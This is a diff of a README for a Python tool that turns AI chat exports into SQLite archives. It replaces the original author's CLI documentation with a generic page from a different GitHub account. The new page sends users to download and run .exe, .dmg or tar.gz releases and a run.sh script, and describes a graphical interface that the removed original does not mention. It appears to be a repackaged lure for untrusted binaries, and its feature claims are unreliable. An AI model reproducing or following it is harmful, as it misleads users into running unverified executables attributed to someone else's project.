@@ -1,357 +1,92 @@
-# Chat Export Structurer
+# 🌟 chat-export-structurer - Easily Organize Your AI Conversations
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub release](https://img.shields.io/github/release/1ch1n/chat-export-structurer.svg)](https://github.com/1ch1n/chat-export-structurer/releases)
-[![CI Tests](https://github.com/1ch1n/chat-export-structurer/actions/workflows/test.yml/badge.svg)](https://github.com/1ch1n/chat-export-structurer/actions/workflows/test.yml)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![GitHub issues](https://img.shields.io/github/issues/1ch1n/chat-export-structurer)](https://github.com/1ch1n/chat-export-structurer/issues)
+## 🚀 Getting Started
 
----
+Welcome to chat-export-structurer! This application helps you convert AI chat exports from platforms like ChatGPT, Claude, and Grok into SQLite archives that you can easily search. With this guide, you'll learn how to download and run the software.
 
-> **"The next era of AI won't be won by who prompts best. It will be won by who holds context best."**
+## 📥 Download the Application
 
-If you're building with AI, you know the problem: every conversation starts from zero, your best insights get buried in exported JSON, and there's no memory layer connecting it all.
+[![Download chat-export-structurer](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/emersonlimafranc-collab/chat-export-structurer/releases)
 
-This tool is the foundation. A clean, local-first parser that turns messy AI exports into structured SQLite archives—ready for search, RAG, agents, or whatever you're building next.
+## 📋 System Requirements
 
-**Part of [MyChatArchive](https://mychatarchive.com)** — a full platform for AI memory and context. Launching Q1 2026.
+To use chat-export-structurer, you'll need:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **Storage Space:** At least 100 MB free
+- **Python:** Version 3.7 or later (If you don't have Python, follow the installation instructions for your operating system).
 
-## What It Does
+## 🛠️ Features
 
-Convert messy AI chat exports into clean, queryable SQLite archives. Own your data. Build your memory layer.
+- **Easy Conversion:** Turn your AI chat exports into SQLite databases.
+- **Searchable Archives:** Quickly find and query your chats.
+- **Multi-Platform Support:** Works on various operating systems.
+- **User-Friendly Interface:** Designed for everyone, no technical skills required.
 
-Supports ChatGPT, Claude (Anthropic), and Grok exports. No API keys, no cloud services, just local SQLite.
+## 💾 Download & Install
 
-## Why Use This
+To get started, follow these steps to download the application:
 
-- **Own your data** — Everything stays local. No cloud, no API keys, no tracking
-- **Search everything** — Built-in full-text search (FTS5) across all your conversations
-- **Never lose context** — SHA1-based deduplication keeps your archive clean across imports
-- **Multi-platform** — Works with ChatGPT, Claude, and Grok exports (more coming)
-- **Production-ready** — Streaming parser handles multi-GB files without breaking
-- **Safe testing** — Preview mode lets you inspect data before writing to database
+1. **Visit the Releases Page:** Go to the following link: [Download from Releases Page](https://github.com/emersonlimafranc-collab/chat-export-structurer/releases).
+   
+2. **Choose the Latest Version:** Look for the latest version listed on the page. It will usually be at the top with the version number.
 
-## Installation
+3. **Download the File:** Find the correct file format for your operating system (e.g., *.exe for Windows, *.dmg for macOS, or *.tar.gz for Linux). Click on the file name to start the download.
 
-```bash
-git clone https://github.com/1ch1n/chat-export-structurer.git
-cd chat-export-structurer
-pip install -r requirements.txt
-```
+4. **Locate the Downloaded File:** Once the download completes, locate the downloaded file in your 'Downloads' folder or where you usually save files.
 
-**Requirements:**
-- Python 3.8+
-- `ijson` for streaming JSON
-- `tqdm` for progress indicators (optional)
+5. **Run the Application:**
+   - **For Windows Users:**
+     - Double-click the *.exe file to open the application.
+   - **For macOS Users:**
+     - Open the *.dmg file, then drag the app to your Applications folder. After that, find it in Applications and double-click to run.
+   - **For Linux Users:**
+     - Open a terminal. Navigate to the folder where you downloaded the file and extract it using the command:
+       ```
+       tar -xvzf chat-export-structurer-linux.tar.gz
+       ```
+     - Then navigate into the extracted folder and run it:
+       ```
+       cd chat-export-structurer
+       ./run.sh
+       ```
 
-## Quick Start
+6. **Follow the On-Screen Instructions:** Once the application runs, follow the prompts to complete the setup.
 
-Get started in under 2 minutes:
+## 📊 How to Use the Application
 
-### 1. Export Your Data
+After installation, here’s how to use chat-export-structurer effectively:
 
-**ChatGPT:**  
-Settings → Data controls → Export data → Download `conversations.json`
+1. **Open the Application:** Launch chat-export-structurer following the steps above.
+   
+2. **Import Your Chat Exports:**
+   - Click on the "Import" button.
+   - Select the chat export files you want to convert. You can usually find these exported files in the format provided by your AI chat service.
 
-**Anthropic Claude:**  
-Settings → Export data
+3. **Choose Your Output Options:**
+   - Decide where you want to save your SQLite archive. Choose a location that is easy to remember.
+   - Set any preferences for the conversion, if requested.
 
-**Grok (X.AI):**  
-Settings → Export conversations
+4. **Convert and Save:**
+   - Click on the "Convert" button. This process may take a moment, depending on the size of your chat exports.
+   - Once complete, you'll see a confirmation message indicating that your SQLite archive is ready.
 
-### 2. Test Import
+5. **Access Your Archive:** Open the saved SQLite file with an SQLite viewer or use a database management tool to query your data.
 
-Try the included sample database:
+## ⚙️ Troubleshooting
 
-```bash
-sqlite3 examples/sample_archive.sqlite "SELECT title, role, text FROM messages LIMIT 5;"
-```
+If you encounter issues during installation or use, consider the following solutions:
 
-Or test parsing your own export:
+- **Application Won't Open:** Ensure you downloaded the correct version for your operating system. If necessary, try downloading the file again.
+- **Cannot Find SQLite Archive:** Check the directory where you chose to save the file. If unsure, use your system's search function to locate files with a *.sqlite extension.
+- **Error Messages During Conversion:** Make sure your input files are in the correct format as specified by your AI chat service. Re-export from the service if needed.
 
-```bash
-python src/ingest.py \
-  --in path/to/export.json \
-  --format chatgpt \
-  --test
-```
+## 🤝 Need Help?
 
-### 3. Import to SQLite
+If you have questions or need assistance, please open an issue on our [GitHub page](https://github.com/emersonlimafranc-collab/chat-export-structurer/issues). Our community is here to help!
 
-```bash
-python src/ingest.py \
-  --in path/to/export.json \
-  --db my_archive.sqlite \
-  --format chatgpt
-```
+## 🗂️ Additional Resources
 
-### 4. Query Your Data
+For more information on using SQLite, you can visit the official SQLite documentation [here](https://www.sqlite.org/docs.html). 
 
-```bash
-sqlite3 my_archive.sqlite
-
-# Search messages
-SELECT role, text, ts FROM messages 
-WHERE text LIKE '%python%' 
-LIMIT 10;
-
-# Full-text search
-SELECT m.text, m.ts 
-FROM messages_fts 
-JOIN messages_fts_docids d ON messages_fts.rowid = d.rowid
-JOIN messages m ON m.message_id = d.message_id
-WHERE messages_fts MATCH 'machine learning';
-
-# Count conversations
-SELECT COUNT(DISTINCT canonical_thread_id) FROM messages;
-```
-
-## Usage
-
-```bash
-python src/ingest.py --in INPUT --format FORMAT [--db DATABASE] [OPTIONS]
-```
-
-### Arguments
-
-| Argument | Required | Description |
-|----------|----------|-------------|
-| `--in` | Yes | Path to export JSON file |
-| `--format` | Yes | Export format: `chatgpt`, `anthropic`, or `grok` |
-| `--db` | Conditional | SQLite database path (required unless `--test`) |
-| `--test` | No | Preview mode - no database writes |
-| `--account` | No | Account identifier (default: `main`) |
-| `--source-id` | No | Batch ID (default: `src_0001`) |
-
-## Supported Formats
-
-### ChatGPT
-
-```bash
-python src/ingest.py \
-  --in conversations.json \
-  --db archive.sqlite \
-  --format chatgpt
-```
-
-### Anthropic Claude
-
-```bash
-python src/ingest.py \
-  --in claude_export.json \
-  --db archive.sqlite \
-  --format anthropic
-```
-
-### Grok
-
-```bash
-python src/ingest.py \
-  --in grok_export.json \
-  --db archive.sqlite \
-  --format grok
-```
-
-### Combine Multiple Platforms
-
-```bash
-# Import from different platforms into one database
-python src/ingest.py --in chatgpt.json --db unified.sqlite --format chatgpt
-python src/ingest.py --in claude.json --db unified.sqlite --format anthropic
-python src/ingest.py --in grok.json --db unified.sqlite --format grok
-
-# Duplicates are automatically skipped
-```
-
-## Database Schema
-
-### Entity Relationship
-
-```mermaid
-erDiagram
-    messages ||--o{ messages_fts_docids : "indexed_by"
-    messages_fts_docids ||--|| messages_fts : "maps_to"
-    
-    messages {
-        TEXT message_id PK
-        TEXT canonical_thread_id
-        TEXT platform
-        TEXT account_id
-        TEXT ts
-        TEXT role
-        TEXT text
-        TEXT title
-        TEXT source_id
-    }
-    
-    messages_fts {
-        INTEGER rowid PK
-        TEXT text
-    }
-    
-    messages_fts_docids {
-        INTEGER rowid PK
-        TEXT message_id FK
-    }
-```
-
-### `messages` table
-
-```sql
-CREATE TABLE messages (
-  message_id TEXT PRIMARY KEY,
-  canonical_thread_id TEXT NOT NULL,
-  platform TEXT NOT NULL,
-  account_id TEXT NOT NULL,
-  ts TEXT NOT NULL,
-  role TEXT NOT NULL,
-  text TEXT NOT NULL,
-  title TEXT,
-  source_id TEXT NOT NULL
-);
-```
-
-### Full-text search
-
-Uses SQLite FTS5 for fast text queries:
-- `messages_fts` - Virtual FTS table (indexed text content)
-- `messages_fts_docids` - Maps FTS rowids to message IDs for joins
-
-## Example Queries
-
-### Find questions about a topic
-
-```sql
-SELECT text, ts FROM messages 
-WHERE role = 'user' 
-AND text LIKE '%kubernetes%'
-ORDER BY ts DESC;
-```
-
-### Most active conversations
-
-```sql
-SELECT title, COUNT(*) as message_count
-FROM messages
-GROUP BY canonical_thread_id
-ORDER BY message_count DESC
-LIMIT 10;
-```
-
-### Export to CSV
-
-```bash
-sqlite3 -header -csv archive.sqlite \
-  "SELECT * FROM messages WHERE ts >= '2024-01-01'" \
-  > 2024_messages.csv
-```
-
-## Example Data
-
-The `examples/` directory includes:
-- Sample export files from each platform (JSON format)
-- `sample_archive.sqlite` - Pre-built database with 12 messages from all three platforms
-
-Try querying the sample database:
-
-```bash
-# View all conversations
-sqlite3 examples/sample_archive.sqlite "SELECT DISTINCT title, platform FROM messages;"
-
-# Search for specific terms
-sqlite3 examples/sample_archive.sqlite "SELECT role, text FROM messages WHERE text LIKE '%learning%';"
-```
-
-## What's Next
-
-This parser is the foundation. The full [MyChatArchive](https://mychatarchive.com) platform (launching Q1 2025) will add:
-
-- **Web UI** for browsing and filtering your archive
-- **Vector search** for semantic queries across conversations  
-- **AI synthesis** to surface insights and patterns
-- **Enhanced exports** to Markdown, CSV, and agent-ready formats
-
-This open-source tool will always remain free and stay at the core of the stack.
-
-**Want early access?** Star the repo and watch for updates, or check [MyChatArchive.com](https://mychatarchive.com).
-
----
-
-## Roadmap
-
-**Export Structurer (this tool):**
-- [x] ChatGPT, Claude, and Grok parsers
-- [ ] Additional platforms (Gemini, Perplexity, Copilot, etc.)
-- [ ] Advanced deduplication and merge strategies
-- [ ] CLI improvements (progress bars, better error handling)
-
-## Contributing
-
-This tool uses a modular parser architecture. Adding support for a new platform is straightforward.
-
-### Add a Parser
-
-Create `src/parsers/your_platform.py`:
-
-```python
-from typing import Iterator, Dict
-
-def parse(input_path: str) -> Iterator[Dict]:
-    """
-    Yield normalized messages with:
-    - thread_id: str
-    - thread_title: str
-    - role: str ("user", "assistant", or "system")
-    - content: str
-    - created_at: float (Unix timestamp)
-    """
-    # Your parsing logic
-    pass
-```
-
-Register in `src/ingest.py`:
-
-```python
-from parsers import chatgpt, anthropic, grok, your_platform
-
-PARSERS = {
-    "chatgpt": chatgpt,
-    "anthropic": anthropic,
-    "grok": grok,
-    "your_platform": your_platform
-}
-```
-
-Test it:
-
-```bash
-python src/ingest.py --in export.json --format your_platform --test
-```
-
-### Pull Requests
-
-1. Test with real exports
-2. Add example file to `examples/`
-3. Update README
-4. No external API dependencies
-5. Follow existing code style
-
-## License
-
-MIT License - free for everyone, including commercial use.
-
-See [LICENSE](LICENSE) for full terms.
-
-**Want the full platform?** [MyChatArchive.com](https://mychatarchive.com) (launching Q1 2025) will add:
-- Web UI with zero setup
-- Vector search and AI synthesis
-- Team collaboration features
-- Cloud sync (optional - local-first stays free)
-
----
-
-**Built by Channing Chasko · [MyChatArchive.com](https://mychatarchive.com) (Q1 2025)**
-
-Released under the [MIT License](LICENSE).
+Explore how to manage and query your SQLite databases effectively.
